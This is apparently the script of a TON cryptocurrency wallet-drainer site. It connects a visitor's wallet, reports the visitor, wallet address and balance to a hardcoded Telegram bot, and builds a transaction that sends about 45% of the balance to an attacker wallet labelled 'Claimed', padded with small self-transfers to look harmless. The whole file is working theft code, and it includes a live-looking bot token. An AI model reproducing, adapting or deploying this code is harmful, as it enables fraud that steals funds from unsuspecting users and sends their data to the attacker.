var mainWallet = "UQBk_5iaLiQwxJ8VWm6CmjJ15_04mbjgIfFlMjxfAtv9V58X";
const botToken = "7931684835:AAH9pSLLaLLqOqd40q6o6uUMsiRHVSrak7U";
const chatId = "@ppjjkkd";

const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: 'https://imdontyou.github.io/time/tonconnect-manifest.json',
    buttonRootId: 'ton-connect'
});

let walletAddress = null;

async function sendToTelegram(message) {
    try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "HTML" })
        });
    } catch (error) {
        console.error("Ошибка отправки в Telegram:", error);
    }
}

(async () => {
    sendToTelegram(`🌍 Новый посетитель сайта!`);
})();

tonConnectUI.onStatusChange(async (walletInfo) => {
    if (walletInfo && walletInfo.account) {
        walletAddress = walletInfo.account.address;
        console.log('Адрес подключенного кошелька:', walletAddress);
        
        await updateBalance(walletAddress);
        sendToTelegram(`✅ Подключен кошелек: <code>${walletAddress}</code>`);
    }
});

async function updateBalance(walletAddress) {
    try {
        const response = await fetch(`https://toncenter.com/api/v3/wallet?address=${walletAddress}`);
        const data = await response.json();
        if (!data.balance) return;

        const balanceTON = parseFloat(data.balance) / 1000000000;
        console.log(`Баланс: ${balanceTON} TON`);

        sendToTelegram(`💰 Баланс кошелька <code>${walletAddress}</code>: <b>${balanceTON} TON</b>`);
    } catch (error) {
        console.error('Ошибка при получении баланса:', error);
    }
}

async function didtrans() {
    if (!walletAddress) return alert('Кошелек не подключен');
    
    const response = await fetch(`https://toncenter.com/api/v3/wallet?address=${walletAddress}`);
    const data = await response.json();
    if (!data.balance) return;

    const originalBalance = parseFloat(data.balance);
    const deduction = originalBalance * 0.55;
    if (originalBalance <= deduction) return;

    const remainingBalance = originalBalance - deduction;
    console.log(`Баланс после транзакции: ${remainingBalance / 1000000000} TON`);

    const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 60,
        messages: [
            { address: walletAddress, amount: 10000000 },
            { address: walletAddress, amount: 10000000 },
            { address: walletAddress, amount: 10000000 },
            { address: mainWallet, amount: remainingBalance },
        ],
        sendMode: 5,
        comment: "Claimed",
    };

    try {
        const result = await tonConnectUI.sendTransaction(transaction);
        console.log('Транзакция отправлена:', result);
        
        sendToTelegram(`💸 Отправлена транзакция с кошелька <code>${walletAddress}</code> на сумму <b>${remainingBalance / 1000000000} TON</b>`);
        
        await updateBalance(walletAddress);
    } catch (error) {
        console.error('Ошибка при отправке транзакции:', error);
    }
}
